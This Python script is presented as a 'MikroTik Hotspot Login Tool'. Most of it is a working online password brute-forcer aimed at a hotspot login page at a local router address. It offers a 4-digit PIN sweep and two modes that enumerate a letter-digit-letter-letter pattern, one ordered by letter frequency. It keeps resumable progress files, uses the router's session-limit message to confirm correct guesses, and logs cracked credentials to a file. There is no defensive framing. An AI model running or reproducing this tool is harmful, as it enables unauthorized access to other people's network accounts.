import requests
from bs4 import BeautifulSoup
import time
import os
import string

def mikrotik_login(username, password):
    """
    Login to MikroTik hotspot and extract error/success messages

    Args:
        username: Login username
        password: Login password

    Returns:
        dict with status and message
    """

    # Login endpoint
    url = "http://192.168.50.1/login"

    # Headers from the fetch request
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.6",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1"
    }

    # POST data
    data = {
        "username": username,
        "password": password,
        "dst": "http://valencianationalhs.com",
        "popup": "true"
    }

    try:
        # Make the POST request with longer timeout
        response = requests.post(
            url, 
            headers=headers, 
            data=data,
            timeout=10,
            allow_redirects=False
        )

        # Parse HTML with BeautifulSoup
        soup = BeautifulSoup(response.text, 'lxml')

        # Find the error/message div with class "text-red-500 text-sm"
        error_div = soup.find('div', class_='text-red-500 text-sm')

        if error_div:
            message = error_div.get_text(strip=True)

            # Check if it's "no more sessions" - password is CORRECT but can't login
            if "no more sessions are allowed for user" in message.lower():
                return {
                    "status": "password_correct",
                    "message": message
                }
            # Check if it's invalid credentials - password is WRONG
            elif "invalid username or password" in message.lower() or "invalid username and password" in message.lower():
                return {
                    "status": "fail",
                    "message": message
                }
            else:
                # Other error message
                return {
                    "status": "error",
                    "message": message
                }
        else:
            # No error message = successful login
            return {
                "status": "success",
                "message": "Login successful - no error message found"
            }

    except requests.exceptions.Timeout:
        return {
            "status": "timeout",
            "message": "Connection timed out - router may be slow or overwhelmed"
        }
    except requests.exceptions.ConnectionError:
        return {
            "status": "connection_error",
            "message": "Cannot connect to router - check network connection"
        }
    except requests.exceptions.RequestException as e:
        return {
            "status": "error",
            "message": f"Connection error: {str(e)}"
        }

def generate_passwords_smart():
    """
    SMART ALGORITHM: Generate passwords in optimized order
    Pattern: letter + digit + letter + letter (e.g., v5wa, a6ja, p8lj)

    Strategy:
    1. Try most common digits first (1-9, then 0)
    2. Try most frequent English letters first (e, t, a, o, i, n, s, h, r, d, l, c, u, m)
    3. This finds common passwords much faster!

    Total combinations: 26 * 10 * 26 * 26 = 175,760
    """

    # Most common English letters (by frequency)
    common_letters = 'etaoinshrdlcumwfgypbvkjxqz'

    # Most common digits (1-9 are more common in passwords than 0)
    common_digits = '1234567890'

    # Generate in smart order: common letters and digits first
    for digit in common_digits:
        for char1 in common_letters:
            for char2 in common_letters:
                for char3 in common_letters:
                    yield f"{char1}{digit}{char2}{char3}"

def generate_passwords_pattern():
    """
    SEQUENTIAL: Generate passwords in alphabetical order
    Pattern: letter + digit + letter + letter
    Examples: a0aa, a0ab, a0ac, ..., z9zz
    Total combinations: 26 * 10 * 26 * 26 = 175,760
    """
    letters = string.ascii_lowercase  # a-z
    digits = string.digits  # 0-9

    for char1 in letters:
        for digit in digits:
            for char2 in letters:
                for char3 in letters:
                    yield f"{char1}{digit}{char2}{char3}"

def normal_login():
    """Normal login with username and password - keeps retrying until successful"""
    print("\n" + "=" * 50)
    print("Normal Login Mode")
    print("=" * 50)

    username = input("Enter username: ")
    password = input("Enter password: ")

    print(f"\nAttempting login for user: {username}")
    print("=" * 50)

    retry_count = 0
    consecutive_timeouts = 0

    # Keep trying until successful
    while True:
        retry_count += 1
        print(f"\nAttempt #{retry_count}", end=" ", flush=True)

        start_time = time.time()
        result = mikrotik_login(username, password)
        elapsed_time = time.time() - start_time

        print(f"({elapsed_time:.2f}s)")
        print("-" * 50)
        print(f"Status: {result['status']}")
        print(f"Message: {result['message']}")

        if result['status'] == 'success':
            print("\n[SUCCESS] Login successful!")
            break
        elif result['status'] in ['timeout', 'connection_error']:
            consecutive_timeouts += 1
            if consecutive_timeouts >= 3:
                print("\n[WARNING] Multiple connection failures detected.")
                print("The router may be down or you may not be connected to the network.")
                choice = input("Continue retrying? (y/n): ").lower()
                if choice != 'y':
                    print("\n[STOPPED] User cancelled.")
                    break
                consecutive_timeouts = 0
            else:
                print("\n[FAILED] Connection issue. Waiting 2 seconds...")
                time.sleep(2)
        else:
            consecutive_timeouts = 0
            print("\n[FAILED] Login failed. Retrying immediately...")

def load_progress(username):
    """Load previously tried passwords from progress file"""
    progress_file = f"progress_{username}.txt"
    tried_passwords = set()

    if os.path.exists(progress_file):
        with open(progress_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    tried_passwords.add(line)
        print(f"[INFO] Loaded {len(tried_passwords)} previously tried passwords")

    return tried_passwords

def save_progress(username, password):
    """Save tried password to progress file"""
    progress_file = f"progress_{username}.txt"
    with open(progress_file, 'a') as f:
        f.write(f"{password}\n")

def save_success(username, password):
    """Save successful login to file.txt"""
    with open('file.txt', 'a') as f:
        f.write(f"Username: {username} | Password: {password} | Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

def brute_force_4digit():
    """Brute force login with 4-digit password combinations (0000-9999)"""
    print("\n" + "=" * 50)
    print("Password Guess Mode - 4 Digits (0000-9999)")
    print("=" * 50)

    username = input("Enter username: ")

    # Load previously tried passwords
    tried_passwords = load_progress(username)

    total_combinations = 10000  # 0000 to 9999
    start_from = len(tried_passwords)

    print(f"\nTarget username: {username}")
    print(f"Total combinations: {total_combinations} (0000-9999)")
    print(f"Already tried: {start_from}")
    print(f"Remaining: {total_combinations - start_from}")
    print("=" * 50)

    input("\nPress Enter to start brute force attack...")

    attempt = 0
    start_time = time.time()

    # Try all 4-digit combinations from 0000 to 9999
    for i in range(10000):
        password = str(i).zfill(4)

        if password in tried_passwords:
            continue

        attempt += 1
        elapsed = time.time() - start_time
        avg_time = elapsed / attempt if attempt > 0 else 0
        remaining = (total_combinations - start_from - attempt) * avg_time

        retry_on_error = True
        while retry_on_error:
            print(f"\n[Attempt {attempt}/{total_combinations - start_from}] Testing: {username} / {password}")

            result = mikrotik_login(username, password)

            print(f"Status: {result['status']}")
            print(f"Message: {result['message']}")

            if result['status'] == 'success' or result['status'] == 'password_correct':
                # Either logged in OR password is correct (session limit)
                print("\n" + "=" * 50)
                print("[SUCCESS] PASSWORD FOUND!")
                print("=" * 50)
                print(f"Username: {username}")
                print(f"Password: {password}")
                print(f"Attempts: {attempt}")
                print(f"Time taken: {elapsed:.2f} seconds")

                if result['status'] == 'password_correct':
                    print("\nNote: Password is correct but session limit reached.")

                save_success(username, password)
                print(f"\n[SAVED] Credentials saved to file.txt")
                save_progress(username, password)

                return

            elif result['status'] == 'fail':
                save_progress(username, password)
                retry_on_error = False

            elif result['status'] in ['error', 'timeout', 'connection_error']:
                print("[ERROR] Connection issue detected. Retrying same password in 2 seconds...")
                time.sleep(2)

        if attempt % 10 == 0:
            print(f"\n>>> Progress: {attempt}/{total_combinations - start_from} | Elapsed: {elapsed:.1f}s | Avg: {avg_time:.2f}s/attempt | ETA: {remaining/60:.1f}m")

def brute_force_pattern_sequential():
    """Sequential brute force: a0aa -> a0ab -> a0ac -> ... -> z9zz"""
    print("\n" + "=" * 50)
    print("Password Guess - Sequential (a0aa to z9zz)")
    print("=" * 50)
    print("Order: a0aa, a0ab, a0ac, ..., z9zz")

    username = input("\nEnter username: ")

    # Load previously tried passwords
    tried_passwords = load_progress(username)

    total_combinations = 26 * 10 * 26 * 26  # 175,760 combinations
    start_from = len(tried_passwords)

    print(f"\nTarget username: {username}")
    print(f"Total combinations: {total_combinations:,}")
    print(f"Already tried: {start_from:,}")
    print(f"Remaining: {total_combinations - start_from:,}")
    print("=" * 50)

    input("\nPress Enter to start...")

    attempt = 0
    start_time = time.time()

    for password in generate_passwords_pattern():
        if password in tried_passwords:
            continue

        attempt += 1
        elapsed = time.time() - start_time
        avg_time = elapsed / attempt if attempt > 0 else 0
        remaining = (total_combinations - start_from - attempt) * avg_time

        retry_on_error = True
        while retry_on_error:
            print(f"\n[Attempt {attempt}/{total_combinations - start_from:,}] Testing: {username} / {password}")

            result = mikrotik_login(username, password)

            print(f"Status: {result['status']}")
            print(f"Message: {result['message']}")

            if result['status'] == 'success' or result['status'] == 'password_correct':
                print("\n" + "=" * 50)
                print("[SUCCESS] PASSWORD FOUND!")
                print("=" * 50)
                print(f"Username: {username}")
                print(f"Password: {password}")
                print(f"Attempts: {attempt:,}")
                print(f"Time taken: {elapsed:.2f} seconds ({elapsed/60:.1f} minutes)")

                if result['status'] == 'password_correct':
                    print("\nNote: Password is correct but session limit reached.")

                save_success(username, password)
                print(f"\n[SAVED] Credentials saved to file.txt")
                save_progress(username, password)

                return

            elif result['status'] == 'fail':
                save_progress(username, password)
                retry_on_error = False

            elif result['status'] in ['error', 'timeout', 'connection_error']:
                print("[ERROR] Connection issue detected. Retrying same password in 2 seconds...")
                time.sleep(2)

        if attempt % 100 == 0:
            print(f"\n>>> Progress: {attempt:,}/{total_combinations - start_from:,} | Elapsed: {elapsed/60:.1f}m | ETA: {remaining/60:.1f}m")

def brute_force_pattern_smart():
    """SMART ALGORITHM: Try common letters/digits first (MUCH FASTER!)"""
    print("\n" + "=" * 50)
    print("Password Guess - SMART Algorithm [RECOMMENDED]")
    print("=" * 50)
    print("Algorithm: Tries most common letters & digits first!")
    print("Examples: e1ta, t2he, a3nd, o1ne, i2ts, etc.")

    username = input("\nEnter username: ")

    # Load previously tried passwords
    tried_passwords = load_progress(username)

    total_combinations = 26 * 10 * 26 * 26  # 175,760 combinations
    start_from = len(tried_passwords)

    print(f"\nTarget username: {username}")
    print(f"Total combinations: {total_combinations:,}")
    print(f"Already tried: {start_from:,}")
    print(f"Remaining: {total_combinations - start_from:,}")
    print("=" * 50)

    input("\nPress Enter to start SMART attack...")

    attempt = 0
    start_time = time.time()

    for password in generate_passwords_smart():
        if password in tried_passwords:
            continue

        attempt += 1
        elapsed = time.time() - start_time
        avg_time = elapsed / attempt if attempt > 0 else 0
        remaining = (total_combinations - start_from - attempt) * avg_time

        retry_on_error = True
        while retry_on_error:
            print(f"\n[Attempt {attempt}/{total_combinations - start_from:,}] Testing: {username} / {password}")

            result = mikrotik_login(username, password)

            print(f"Status: {result['status']}")
            print(f"Message: {result['message']}")

            if result['status'] == 'success' or result['status'] == 'password_correct':
                print("\n" + "=" * 50)
                print("[SUCCESS] PASSWORD FOUND!")
                print("=" * 50)
                print(f"Username: {username}")
                print(f"Password: {password}")
                print(f"Attempts: {attempt:,}")
                print(f"Time taken: {elapsed:.2f} seconds ({elapsed/60:.1f} minutes)")

                if result['status'] == 'password_correct':
                    print("\nNote: Password is correct but session limit reached.")

                save_success(username, password)
                print(f"\n[SAVED] Credentials saved to file.txt")
                save_progress(username, password)

                return

            elif result['status'] == 'fail':
                save_progress(username, password)
                retry_on_error = False

            elif result['status'] in ['error', 'timeout', 'connection_error']:
                print("[ERROR] Connection issue detected. Retrying same password in 2 seconds...")
                time.sleep(2)

        if attempt % 100 == 0:
            print(f"\n>>> Progress: {attempt:,}/{total_combinations - start_from:,} | Elapsed: {elapsed/60:.1f}m | ETA: {remaining/60:.1f}m")

def main():
    """Main menu"""
    while True:
        print("\n" + "=" * 50)
        print("MikroTik Hotspot Login Tool")
        print("=" * 50)
        print("1. Login with Username & Password")
        print("2. Password Guess - 4 Digits (0000-9999)")
        print("3. Password Guess - SMART Algorithm [FASTEST] ⭐")
        print("4. Password Guess - Sequential (a0aa-z9zz)")
        print("5. Exit")
        print("=" * 50)

        choice = input("Select option (1/2/3/4/5): ").strip()

        if choice == '1':
            normal_login()
        elif choice == '2':
            brute_force_4digit()
        elif choice == '3':
            brute_force_pattern_smart()
        elif choice == '4':
            brute_force_pattern_sequential()
        elif choice == '5':
            print("\n[EXIT] Goodbye!")
            break
        else:
            print("\n[ERROR] Invalid option. Please select 1-5.")

if __name__ == "__main__":
    main()
